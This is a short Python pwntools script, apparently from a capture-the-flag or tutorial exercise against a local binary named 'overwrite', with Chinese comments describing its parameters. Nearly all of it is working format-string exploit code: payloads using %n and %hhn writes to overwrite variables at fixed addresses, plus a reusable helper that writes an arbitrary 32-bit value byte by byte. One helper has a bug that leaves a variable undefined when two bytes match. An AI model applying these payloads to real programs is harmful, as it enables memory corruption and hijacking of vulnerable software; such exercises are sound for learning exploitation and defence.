#coding=utf-8
from pwn import *

def forc():
    sh = process('./overwrite')
    c_addr = int(sh.recvuntil('\n', drop=True), 16)
    print hex(c_addr)
    payload = p32(c_addr) + '%012d' + '%6$n'
    print payload
    #gdb.attach(sh)
    sh.sendline(payload)
    print sh.recv()
    sh.interactive()


def fora():
    sh = process('./overwrite')
    a_addr = 0x0804A024
    payload = 'aa%8$naa' + p32(a_addr)
    sh.sendline(payload)
    print sh.recv()
    sh.interactive()


def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr

'''
offset 表示要覆盖的地址最初的偏移
size 表示机器字长
addr 表示将要覆盖的地址。
target 表示我们要覆盖为的目的变量值。
'''
def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload


def forb():
    sh = process('./overwrite')
    payload = fmt_str(6, 4, 0x0804A028, 0x12345678)
    print payload
    sh.sendline(payload)
    print sh.recv()
    sh.interactive()


#forc()
#fora()
forb()

